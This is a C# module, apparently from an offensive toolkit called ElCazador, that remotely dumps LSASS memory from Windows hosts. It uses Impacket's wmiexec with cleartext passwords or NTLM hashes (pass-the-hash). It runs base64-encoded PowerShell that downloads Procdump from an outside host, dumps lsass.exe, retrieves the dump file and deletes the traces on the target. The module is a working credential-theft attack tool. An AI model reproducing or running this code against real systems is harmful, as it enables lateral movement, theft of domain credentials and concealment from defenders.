using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using ElCazador.Worker.Interfaces;
using ElCazador.Worker.Models;
using ElCazador.Worker.Modules.Tools.Models;

namespace ElCazador.Worker.Modules.Tools
{
    public class LsassDumpTool : AbstractModule, IToolModule
    {
        public LsassDumpTool(IWorkerController controller) : base(controller, "LsassDumpTool")
        {
        }

        public async Task Run(Target target, User user)
        {
            await Controller.Log(Name, "Dumping LSASS from {0} ({1}) using the user: {2}\\{3}", target.Hostname, target.IP, user.Domain, user.Username);

            Func<Target, User, string, string> getArguments;

            if (user.PasswordType == null || user.PasswordType == "")
            {
                await Controller.Log(Name, "The user {0} does not have a valid password. Dumping lsass requires clear text or NTLM", user.Username);
                return;
            }

            switch (user.PasswordType.ToLowerInvariant())
            {
                case "cleartext":
                    getArguments = GetClearTextArguments;
                    break;
                case "ntlm":
                default:
                    getArguments = GetNTLMArguments;
                    break;

            }


            var command1 = @"""powershell -enc ""aQB3AHIAIAAtAG8AdQB0AGYAIABwAHIAbwBjAGQAdQBtAHAALgB6AGkAcAAgAGgAdAB0AHAAcwA6AC8ALwBkAG8AdwBuAGwAbwBhAGQALgBzAHkAcwBpAG4AdABlAHIAbgBhAGwAcwAuAGMAbwBtAC8AZgBpAGwAZQBzAC8AUAByAG8AYwBkAHUAbQBwAC4AegBpAHAAOwAgAEEAZABkAC0AVAB5AHAAZQAgAC0AYQBzAHMAZQBtAGIAbAB5ACAAIgBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEYAaQBsAGUAcwB5AHMAdABlAG0AIgA7ACAAWwBTAHQAcgBpAG4AZwBdACQAUwBvAHUAcgBjAGUAIAA9ACAAIgBwAHIAbwBjAGQAdQBtAHAALgB6AGkAcAAiADsAIABbAFMAdAByAGkAbgBnAF0AJABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAA9ACAAIgBwAHIAbwBjAGQAdQBtAHAAIgA7ACAAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBaAGkAcABmAGkAbABlAF0AOgA6AEUAeAB0AHIAYQBjAHQAVABvAEQAaQByAGUAYwB0AG8AcgB5ACgAJABTAG8AdQByAGMAZQAsACAAJABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AKQA7ACAAIABwAHIAbwBjAGQAdQBtAHAAXABwAHIAbwBjAGQAdQBtAHAANgA0AC4AZQB4AGUAIAAtAGEAYwBjAGUAcAB0AGUAdQBsAGEAIAAtAG8AIAAtAG0AYQAgAGwAcwBhAHMAcwAuAGUAeABlACAAZABlAGIAdQBnAC4AZABtAHAAOwAgACAAcgBtACAALQByACAAcAByAG8AYwBkAHUAbQBwAC4AegBpAHAAOwAgAHIAbQAgAC0AcgAgAHAAcgBvAGMAZAB1AG0AcAA7AA==""""";

            var command2 = @"get debug.dmp";

            var command3 = @"""powershell -enc ""cgBtACAAZABlAGIAdQBnAC4AZABtAHAA""""";

            if (!await RunProcess(target, user, command1, getArguments))
            {
                return;
            }

            if (!await RunProcess(target, user, command2, getArguments))
            {
                return;
            }
            if (!await RunProcess(target, user, command3, getArguments))
            {
                return;
            }

            var dumpFilePath = string.Format("{0}{1}.dmp", Controller.WorkerSettings.DumpPath, target.Hostname);

            if (File.Exists(dumpFilePath))
            {
                File.Delete(dumpFilePath);
            }

            File.Move(
                string.Format("./debug.dmp", Controller.WorkerSettings.ImpacketExamplesPath),
                dumpFilePath);

            await Controller.Log(Name, "Dumped LSASS from {0} ({1}) using the user: {2}\\{3}", target.Hostname, target.IP, user.Domain, user.Username);
        }

        private async Task<bool> RunProcess(Target target, User user, string command, Func<Target, User, string, string> getArguments)
        {
            var result = await ProcessStarter.Start("python", getArguments(target, user, command));

            await Controller.Log(Name, result.ResultOutput);

            if (result.HasErrors)
            {
                await Controller.Log(Name, result.ResultOutput);
                return false;
            }

            return true;
        }

        private string GetClearTextArguments(Target target, User user, string command)
        {
            return string.Format(
                "{0}wmiexec.py {1}/{2}{3}@{4} {5}",
                Controller.WorkerSettings.ImpacketExamplesPath,
                user.Domain,
                user.Username,
                ":" + user.Hash,
                target.IP,
                command
                );
        }

        private string GetNTLMArguments(Target target, User user, string command)
        {
            return string.Format(
                "{0}wmiexec.py {1}/{2}@{3} {4} -hashes 0:{5}",
                Controller.WorkerSettings.ImpacketExamplesPath,
                user.Domain,
                user.Username,
                target.IP,
                command,
                user.Hash
                );
        }
    }
}